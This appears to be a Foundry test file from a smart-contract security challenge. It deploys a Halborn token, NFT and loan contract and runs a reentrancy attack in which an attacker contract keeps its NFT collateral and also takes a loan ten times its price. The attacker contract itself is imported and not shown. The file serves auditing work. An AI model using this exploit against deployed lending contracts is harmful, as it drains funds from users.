// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

//import {UpgradeToken} from "../script/UpgradeToken.s.sol";
import {Test, console} from "forge-std/Test.sol";
import {StdCheats} from "forge-std/StdCheats.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";



import {IERC20} from "../src/HalbornToken_flattened.sol";
//import {HalbornTokenV2} from "../src/HalbornToken_flattened_v2.sol";
import {DeployAll4Loans} from "../script/DeployAll4Loans.s.sol";

import {IHalbornNFT, IERC721} from "../src/HalbornNFT_flattened.sol";


import {ReentrancyAttacker,ReentrancyVictim} from "../src/reentrancyAtacker.sol";
contract DeployAndTakeLoanReenterTest is StdCheats, Test {
    DeployAll4Loans public deployAll4Loan;

    address public OWNER = address(1);
    address public ATACKER = address(2);
    address payable public reenterContract;
    address public tokenH;
    address public nft;
    address payable nftP;
    address public loan;
    bool testingFlow = true;

    uint256 public price;

    function setUp() public {
        vm.startPrank(OWNER,OWNER);
        deployAll4Loan = new DeployAll4Loans();
        (tokenH,nft,loan)= deployAll4Loan.run();
 
        nftP = payable(nft);
        price = IHalbornNFT(nft).price();
        // loan = victim 
        ReentrancyAttacker reentrancyAttacker= new ReentrancyAttacker(loan,nft,price);
        reenterContract = payable(address(reentrancyAttacker));
        vm.stopPrank();

    }

    function testLoansDeployed() public {

 console.log("%s",1);
        assertTrue(true);

        
    }


    function testMintingNFT() public {

         vm.startPrank(ATACKER);
         vm.deal(ATACKER,10 ether);

        uint256 balanceOfAtacker = IERC721(nft).balanceOf(ATACKER);
      assertEq(balanceOfAtacker,0);

        // 2000 is set in deploy scripe price of nft

    assertEq(price, 2000);

         uint256 versio = IHalbornNFT(nftP).version();
         assertEq(versio, 1);
    uint256 konter = IHalbornNFT(nftP).increaseCounter();
    IHalbornNFT(nftP).mintBuyWithETH{value: price}();
        balanceOfAtacker = IERC721(nft).balanceOf(ATACKER);
      assertEq(balanceOfAtacker,1);
 vm.stopPrank();


    }


    function testDepositNFTinLoans() public {

         vm.startPrank(ATACKER);
  

          // 2000 is set in deploy scripe price of nft
        uint256 price = IHalbornNFT(nft).price();
        vm.deal(ATACKER, price*10 ether);


        IHalbornNFT(nftP).mintBuyWithETH{value: price}();
        uint256 balanceOfAtacker = IERC721(nft).balanceOf(ATACKER);

        assertEq(balanceOfAtacker,1);
        
        uint256 whatToDeposit = IHalbornNFT(nftP).idCounter();
        
        assertEq(whatToDeposit,1);
        assertTrue(IERC721(nftP).ownerOf(whatToDeposit) == ATACKER);
        assertTrue(loan!= address(0x0));

        IERC721(nft).setApprovalForAll(loan, true);

        ReentrancyVictim(payable(loan)).depositNFTCollateral(whatToDeposit);
        
 
    
        



        vm.stopPrank();


    }


    function testReenterAtack() public {

         vm.startPrank(ATACKER);
  

          // 2000 is set in deploy scripe price of nft
        uint256 price = IHalbornNFT(nft).price();
        vm.deal(ATACKER, price*10 ether);


        IHalbornNFT(nftP).mintBuyWithETH{value: price}();
        uint256 balanceOfAtacker = IERC721(nft).balanceOf(ATACKER);

        assertEq(balanceOfAtacker,1);
        
        uint256 whatToDeposit = IHalbornNFT(nftP).idCounter();
        
        assertEq(whatToDeposit,1);
        assertTrue(IERC721(nftP).ownerOf(whatToDeposit) == ATACKER);
        assertTrue(loan!= address(0x0));

        IERC721(nft).setApprovalForAll(loan, true);

        
        //ATACK

        IERC721(nft).transferFrom(ATACKER, reenterContract, whatToDeposit);

        ReentrancyAttacker(reenterContract).attack(whatToDeposit);
        // check if NFT is back
        assertTrue(IERC721(nftP).balanceOf(reenterContract) == 1);  
        assertTrue(IERC721(nftP).ownerOf(whatToDeposit) == reenterContract);    
// atacker takey 10 * price of collateral as loan 
        assertEq(IERC20(tokenH).balanceOf(reenterContract),10*price);   

  

        vm.stopPrank();


    }


   /* 
        uint256 expectedValue = 7;
        vm.expectRevert();
        BoxV2(proxyAddress).mint(expectedValue);
*/




}
